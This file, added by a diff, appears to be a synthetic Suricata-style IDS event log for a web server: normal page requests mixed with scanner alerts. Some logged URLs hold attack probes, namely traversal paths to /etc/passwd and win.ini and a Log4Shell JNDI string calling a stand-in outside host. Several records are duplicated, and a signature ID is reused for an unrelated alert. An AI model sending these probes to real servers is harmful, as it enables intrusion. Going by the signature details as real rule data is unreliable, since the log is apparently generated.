@@ -1,0 +1,3245 @@
+[
+    {
+        "timestamp": "2025-02-23T10:15:19.130726+0300",
+        "flow_id": 1829127292340101,
+        "pcap_cnt": 140101,
+        "event_type": "http",
+        "src_ip": "192.168.1.105",
+        "src_port": 55123,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/index.html",
+            "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "http_content_type": "text/html",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 200,
+            "length": 15432
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 6,
+            "pkts_toclient": 8,
+            "bytes_toserver": 892,
+            "bytes_toclient": 15892,
+            "start": "2025-02-23T10:15:18.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:15:20.130726+0300",
+        "flow_id": 1829127292340102,
+        "pcap_cnt": 140102,
+        "event_type": "alert",
+        "src_ip": "192.168.7.221",
+        "src_port": 55199,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "alert": {
+            "action": "allowed",
+            "gid": 1,
+            "signature_id": 2002664,
+            "rev": 10,
+            "signature": "ET SCAN Nessus User Agent",
+            "category": "Attempted Information Leak",
+            "severity": 2
+        },
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/admin/",
+            "http_user_agent": "Mozilla/4.75 [en] (X11, U; Nessus)",
+            "http_content_type": "text/html",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 404,
+            "length": 209
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 4,
+            "pkts_toclient": 4,
+            "bytes_toserver": 567,
+            "bytes_toclient": 671,
+            "start": "2025-02-23T10:15:19.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:15:19.130726+0300",
+        "flow_id": 1829127292340101,
+        "pcap_cnt": 140101,
+        "event_type": "http",
+        "src_ip": "192.168.1.105",
+        "src_port": 55123,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/index.html",
+            "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "http_content_type": "text/html",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 200,
+            "length": 15432
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 6,
+            "pkts_toclient": 8,
+            "bytes_toserver": 892,
+            "bytes_toclient": 15892,
+            "start": "2025-02-23T10:15:18.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:15:21.130726+0300",
+        "flow_id": 1829127292340103,
+        "pcap_cnt": 140103,
+        "event_type": "http",
+        "src_ip": "192.168.1.110",
+        "src_port": 55124,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/styles/main.css",
+            "http_user_agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
+            "http_content_type": "text/css",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 200,
+            "length": 4321
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 5,
+            "pkts_toclient": 6,
+            "bytes_toserver": 723,
+            "bytes_toclient": 4567,
+            "start": "2025-02-23T10:15:20.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:15:22.130726+0300",
+        "flow_id": 1829127292340104,
+        "pcap_cnt": 140104,
+        "event_type": "alert",
+        "src_ip": "192.168.7.221",
+        "src_port": 55200,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "alert": {
+            "action": "allowed",
+            "gid": 1,
+            "signature_id": 2022847,
+            "rev": 8,
+            "signature": "ET WEB_SERVER Possible Directory Traversal",
+            "category": "Attempted Information Leak",
+            "severity": 2
+        },
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/../../../../etc/passwd",
+            "http_user_agent": "sqlmap/1.6",
+            "http_content_type": "text/html",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 404,
+            "length": 209
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 4,
+            "pkts_toclient": 4,
+            "bytes_toserver": 589,
+            "bytes_toclient": 671,
+            "start": "2025-02-23T10:15:21.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:15:23.130726+0300",
+        "flow_id": 1829127292340105,
+        "pcap_cnt": 140105,
+        "event_type": "http",
+        "src_ip": "192.168.1.102",
+        "src_port": 55125,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/images/logo.png",
+            "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
+            "http_content_type": "image/png",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 200,
+            "length": 25678
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 7,
+            "pkts_toclient": 12,
+            "bytes_toserver": 1023,
+            "bytes_toclient": 26123,
+            "start": "2025-02-23T10:15:22.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:15:19.130726+0300",
+        "flow_id": 1829127292340101,
+        "pcap_cnt": 140101,
+        "event_type": "http",
+        "src_ip": "192.168.1.105",
+        "src_port": 55123,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/index.html",
+            "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "http_content_type": "text/html",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 200,
+            "length": 15432
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 6,
+            "pkts_toclient": 8,
+            "bytes_toserver": 892,
+            "bytes_toclient": 15892,
+            "start": "2025-02-23T10:15:18.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:15:24.130726+0300",
+        "flow_id": 1829127292340106,
+        "pcap_cnt": 140106,
+        "event_type": "alert",
+        "src_ip": "192.168.9.31",
+        "src_port": 38912,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "alert": {
+            "action": "allowed",
+            "gid": 1,
+            "signature_id": 2010935,
+            "rev": 12,
+            "signature": "ET SCAN Nikto User Agent",
+            "category": "Attempted Information Leak",
+            "severity": 2
+        },
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/phpmyadmin/",
+            "http_user_agent": "Mozilla/5.0 (Nikto/2.5)",
+            "http_content_type": "text/html",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 404,
+            "length": 209
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 4,
+            "pkts_toclient": 4,
+            "bytes_toserver": 545,
+            "bytes_toclient": 671,
+            "start": "2025-02-23T10:15:23.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:15:25.130726+0300",
+        "flow_id": 1829127292340107,
+        "pcap_cnt": 140107,
+        "event_type": "http",
+        "src_ip": "192.168.1.115",
+        "src_port": 55126,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/contact.html",
+            "http_user_agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
+            "http_content_type": "text/html",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 200,
+            "length": 8923
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 6,
+            "pkts_toclient": 7,
+            "bytes_toserver": 891,
+            "bytes_toclient": 9123,
+            "start": "2025-02-23T10:15:24.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:15:26.130726+0300",
+        "flow_id": 1829127292340108,
+        "pcap_cnt": 140108,
+        "event_type": "alert",
+        "src_ip": "192.168.7.221",
+        "src_port": 55201,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "alert": {
+            "action": "allowed",
+            "gid": 1,
+            "signature_id": 2029112,
+            "rev": 6,
+            "signature": "ET WEB_SERVER Joomla Vulnerability Scanner",
+            "category": "Attempted Information Leak",
+            "severity": 2
+        },
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/administrator/",
+            "http_user_agent": "Mozilla/5.0 (compatible; JoomlaScan/2.0)",
+            "http_content_type": "text/html",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 404,
+            "length": 209
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 4,
+            "pkts_toclient": 4,
+            "bytes_toserver": 578,
+            "bytes_toclient": 671,
+            "start": "2025-02-23T10:15:25.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:15:27.130726+0300",
+        "flow_id": 1829127292340109,
+        "pcap_cnt": 140109,
+        "event_type": "http",
+        "src_ip": "192.168.1.108",
+        "src_port": 55127,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/about.html",
+            "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0",
+            "http_content_type": "text/html",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 200,
+            "length": 5678
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 5,
+            "pkts_toclient": 6,
+            "bytes_toserver": 734,
+            "bytes_toclient": 5987,
+            "start": "2025-02-23T10:15:26.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:15:28.130726+0300",
+        "flow_id": 1829127292340110,
+        "pcap_cnt": 140110,
+        "event_type": "alert",
+        "src_ip": "192.168.9.31",
+        "src_port": 38913,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "alert": {
+            "action": "allowed",
+            "gid": 1,
+            "signature_id": 2002911,
+            "rev": 9,
+            "signature": "ET SCAN OpenVAS User Agent",
+            "category": "Attempted Information Leak",
+            "severity": 2
+        },
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/backup/",
+            "http_user_agent": "Mozilla/5.0 (compatible; OpenVAS)",
+            "http_content_type": "text/html",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 404,
+            "length": 209
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 4,
+            "pkts_toclient": 4,
+            "bytes_toserver": 556,
+            "bytes_toclient": 671,
+            "start": "2025-02-23T10:15:27.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:15:29.130726+0300",
+        "flow_id": 1829127292340111,
+        "pcap_cnt": 140111,
+        "event_type": "http",
+        "src_ip": "192.168.1.120",
+        "src_port": 55128,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/products/item1",
+            "http_user_agent": "Mozilla/5.0 (iPad; CPU OS 15_0 like Mac OS X) AppleWebKit/605.1.15",
+            "http_content_type": "text/html",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 200,
+            "length": 12345
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 6,
+            "pkts_toclient": 8,
+            "bytes_toserver": 912,
+            "bytes_toclient": 12893,
+            "start": "2025-02-23T10:15:28.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:15:30.130726+0300",
+        "flow_id": 1829127292340112,
+        "pcap_cnt": 140112,
+        "event_type": "alert",
+        "src_ip": "192.168.7.221",
+        "src_port": 55202,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "alert": {
+            "action": "allowed",
+            "gid": 1,
+            "signature_id": 2025594,
+            "rev": 7,
+            "signature": "ET WEB_SERVER WordPress Vulnerability Scanner",
+            "category": "Attempted Information Leak",
+            "severity": 2
+        },
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/wp-content/plugins/",
+            "http_user_agent": "WPScan/3.8",
+            "http_content_type": "text/html",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 404,
+            "length": 209
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 4,
+            "pkts_toclient": 4,
+            "bytes_toserver": 567,
+            "bytes_toclient": 671,
+            "start": "2025-02-23T10:15:29.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:15:31.130726+0300",
+        "flow_id": 1829127292340113,
+        "pcap_cnt": 140113,
+        "event_type": "http",
+        "src_ip": "192.168.1.112",
+        "src_port": 55129,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/favicon.ico",
+            "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "http_content_type": "image/x-icon",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 200,
+            "length": 1150
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 4,
+            "pkts_toclient": 5,
+            "bytes_toserver": 534,
+            "bytes_toclient": 1423,
+            "start": "2025-02-23T10:15:30.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:15:32.130726+0300",
+        "flow_id": 1829127292340114,
+        "pcap_cnt": 140114,
+        "event_type": "alert",
+        "src_ip": "192.168.9.31",
+        "src_port": 38914,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "alert": {
+            "action": "allowed",
+            "gid": 1,
+            "signature_id": 2022847,
+            "rev": 8,
+            "signature": "ET WEB_SERVER Log4Shell JNDI Injection Attempt",
+            "category": "Attempted Information Leak",
+            "severity": 2
+        },
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/webapp/${jndi:ldap://malicious.ru/a}",
+            "http_user_agent": "Mozilla/5.0 (compatible; Nmap Scripting Engine)",
+            "http_content_type": "text/html",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 404,
+            "length": 209
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 4,
+            "pkts_toclient": 4,
+            "bytes_toserver": 612,
+            "bytes_toclient": 671,
+            "start": "2025-02-23T10:15:31.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:15:33.130726+0300",
+        "flow_id": 1829127292340115,
+        "pcap_cnt": 140115,
+        "event_type": "http",
+        "src_ip": "192.168.1.125",
+        "src_port": 55130,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/blog/post1",
+            "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
+            "http_content_type": "text/html",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 200,
+            "length": 7890
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 6,
+            "pkts_toclient": 7,
+            "bytes_toserver": 867,
+            "bytes_toclient": 8234,
+            "start": "2025-02-23T10:15:32.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:15:34.130726+0300",
+        "flow_id": 1829127292340116,
+        "pcap_cnt": 140116,
+        "event_type": "alert",
+        "src_ip": "192.168.7.221",
+        "src_port": 55203,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "alert": {
+            "action": "allowed",
+            "gid": 1,
+            "signature_id": 2013024,
+            "rev": 11,
+            "signature": "ET SCAN Acunetix User Agent",
+            "category": "Attempted Information Leak",
+            "severity": 2
+        },
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/.git/config",
+            "http_user_agent": "Mozilla/5.0 (compatible; Acunetix)",
+            "http_content_type": "text/html",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 404,
+            "length": 209
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 4,
+            "pkts_toclient": 4,
+            "bytes_toserver": 578,
+            "bytes_toclient": 671,
+            "start": "2025-02-23T10:15:33.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:15:35.130726+0300",
+        "flow_id": 1829127292340117,
+        "pcap_cnt": 140117,
+        "event_type": "http",
+        "src_ip": "192.168.1.118",
+        "src_port": 55131,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/search?q=test",
+            "http_user_agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
+            "http_content_type": "text/html",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 200,
+            "length": 4567
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 5,
+            "pkts_toclient": 6,
+            "bytes_toserver": 745,
+            "bytes_toclient": 4890,
+            "start": "2025-02-23T10:15:34.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:15:36.130726+0300",
+        "flow_id": 1829127292340118,
+        "pcap_cnt": 140118,
+        "event_type": "alert",
+        "src_ip": "192.168.9.31",
+        "src_port": 38915,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "alert": {
+            "action": "allowed",
+            "gid": 1,
+            "signature_id": 2034921,
+            "rev": 5,
+            "signature": "ET WEB_SERVER Spring Boot Actuator Scan",
+            "category": "Attempted Information Leak",
+            "severity": 2
+        },
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/actuator/health",
+            "http_user_agent": "Mozilla/5.0 (compatible; SpringScan/1.0)",
+            "http_content_type": "text/html",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 404,
+            "length": 209
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 4,
+            "pkts_toclient": 4,
+            "bytes_toserver": 567,
+            "bytes_toclient": 671,
+            "start": "2025-02-23T10:15:35.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:15:37.130726+0300",
+        "flow_id": 1829127292340119,
+        "pcap_cnt": 140119,
+        "event_type": "http",
+        "src_ip": "192.168.1.122",
+        "src_port": 55132,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/assets/js/app.js",
+            "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0",
+            "http_content_type": "application/javascript",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 200,
+            "length": 34567
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 8,
+            "pkts_toclient": 15,
+            "bytes_toserver": 1245,
+            "bytes_toclient": 35234,
+            "start": "2025-02-23T10:15:36.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:15:38.130726+0300",
+        "flow_id": 1829127292340120,
+        "pcap_cnt": 140120,
+        "event_type": "alert",
+        "src_ip": "192.168.7.221",
+        "src_port": 55204,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "alert": {
+            "action": "allowed",
+            "gid": 1,
+            "signature_id": 2002664,
+            "rev": 10,
+            "signature": "ET SCAN Nessus User Agent",
+            "category": "Attempted Information Leak",
+            "severity": 2
+        },
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/cgi-bin/test.cgi",
+            "http_user_agent": "Mozilla/4.75 [en] (X11, U; Nessus)",
+            "http_content_type": "text/html",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 404,
+            "length": 209
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 4,
+            "pkts_toclient": 4,
+            "bytes_toserver": 556,
+            "bytes_toclient": 671,
+            "start": "2025-02-23T10:15:37.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:15:39.130726+0300",
+        "flow_id": 1829127292340121,
+        "pcap_cnt": 140121,
+        "event_type": "http",
+        "src_ip": "192.168.1.128",
+        "src_port": 55133,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/category/news",
+            "http_user_agent": "Mozilla/5.0 (iPad; CPU OS 15_0 like Mac OS X) AppleWebKit/605.1.15",
+            "http_content_type": "text/html",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 200,
+            "length": 6789
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 5,
+            "pkts_toclient": 6,
+            "bytes_toserver": 789,
+            "bytes_toclient": 7123,
+            "start": "2025-02-23T10:15:38.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:15:40.130726+0300",
+        "flow_id": 1829127292340122,
+        "pcap_cnt": 140122,
+        "event_type": "alert",
+        "src_ip": "192.168.9.31",
+        "src_port": 38916,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "alert": {
+            "action": "allowed",
+            "gid": 1,
+            "signature_id": 2010935,
+            "rev": 12,
+            "signature": "ET SCAN Nikto User Agent",
+            "category": "Attempted Information Leak",
+            "severity": 2
+        },
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/server-status",
+            "http_user_agent": "Mozilla/5.0 (Nikto/2.5)",
+            "http_content_type": "text/html",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 404,
+            "length": 209
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 4,
+            "pkts_toclient": 4,
+            "bytes_toserver": 545,
+            "bytes_toclient": 671,
+            "start": "2025-02-23T10:15:39.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:15:41.130726+0300",
+        "flow_id": 1829127292340123,
+        "pcap_cnt": 140123,
+        "event_type": "http",
+        "src_ip": "192.168.1.130",
+        "src_port": 55134,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/api/v1/data",
+            "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "http_content_type": "application/json",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 200,
+            "length": 23456
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 7,
+            "pkts_toclient": 9,
+            "bytes_toserver": 1023,
+            "bytes_toclient": 24123,
+            "start": "2025-02-23T10:15:40.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:15:42.130726+0300",
+        "flow_id": 1829127292340124,
+        "pcap_cnt": 140124,
+        "event_type": "alert",
+        "src_ip": "192.168.7.221",
+        "src_port": 55205,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "alert": {
+            "action": "allowed",
+            "gid": 1,
+            "signature_id": 2029112,
+            "rev": 6,
+            "signature": "ET WEB_SERVER Joomla Vulnerability Scanner",
+            "category": "Attempted Information Leak",
+            "severity": 2
+        },
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/joomla/administrator/",
+            "http_user_agent": "Mozilla/5.0 (compatible; JoomlaScan/2.0)",
+            "http_content_type": "text/html",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 404,
+            "length": 209
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 4,
+            "pkts_toclient": 4,
+            "bytes_toserver": 589,
+            "bytes_toclient": 671,
+            "start": "2025-02-23T10:15:41.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:15:43.130726+0300",
+        "flow_id": 1829127292340125,
+        "pcap_cnt": 140125,
+        "event_type": "http",
+        "src_ip": "192.168.1.135",
+        "src_port": 55135,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/old-page.html",
+            "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
+            "http_content_type": "text/html",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 301,
+            "length": 356
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 4,
+            "pkts_toclient": 5,
+            "bytes_toserver": 623,
+            "bytes_toclient": 789,
+            "start": "2025-02-23T10:15:42.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:15:44.130726+0300",
+        "flow_id": 1829127292340126,
+        "pcap_cnt": 140126,
+        "event_type": "alert",
+        "src_ip": "192.168.9.31",
+        "src_port": 38917,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "alert": {
+            "action": "allowed",
+            "gid": 1,
+            "signature_id": 2002911,
+            "rev": 9,
+            "signature": "ET SCAN OpenVAS User Agent",
+            "category": "Attempted Information Leak",
+            "severity": 2
+        },
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/owa/",
+            "http_user_agent": "Mozilla/5.0 (compatible; OpenVAS)",
+            "http_content_type": "text/html",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 404,
+            "length": 209
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 4,
+            "pkts_toclient": 4,
+            "bytes_toserver": 534,
+            "bytes_toclient": 671,
+            "start": "2025-02-23T10:15:43.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:15:45.130726+0300",
+        "flow_id": 1829127292340127,
+        "pcap_cnt": 140127,
+        "event_type": "http",
+        "src_ip": "192.168.1.138",
+        "src_port": 55136,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/download/file.pdf",
+            "http_user_agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
+            "http_content_type": "application/pdf",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 200,
+            "length": 345678
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 12,
+            "pkts_toclient": 45,
+            "bytes_toserver": 2345,
+            "bytes_toclient": 350123,
+            "start": "2025-02-23T10:15:44.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:15:46.130726+0300",
+        "flow_id": 1829127292340128,
+        "pcap_cnt": 140128,
+        "event_type": "alert",
+        "src_ip": "192.168.7.221",
+        "src_port": 55206,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "alert": {
+            "action": "allowed",
+            "gid": 1,
+            "signature_id": 2022847,
+            "rev": 8,
+            "signature": "ET WEB_SERVER Possible Directory Traversal",
+            "category": "Attempted Information Leak",
+            "severity": 2
+        },
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/../../../../windows/win.ini",
+            "http_user_agent": "sqlmap/1.6",
+            "http_content_type": "text/html",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 404,
+            "length": 209
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 4,
+            "pkts_toclient": 4,
+            "bytes_toserver": 601,
+            "bytes_toclient": 671,
+            "start": "2025-02-23T10:15:45.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:15:47.130726+0300",
+        "flow_id": 1829127292340129,
+        "pcap_cnt": 140129,
+        "event_type": "http",
+        "src_ip": "192.168.1.142",
+        "src_port": 55137,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/css/style.css",
+            "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0",
+            "http_content_type": "text/css",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 200,
+            "length": 5678
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 5,
+            "pkts_toclient": 6,
+            "bytes_toserver": 745,
+            "bytes_toclient": 6123,
+            "start": "2025-02-23T10:15:46.870356+0300"
+        }
+    },
+    {
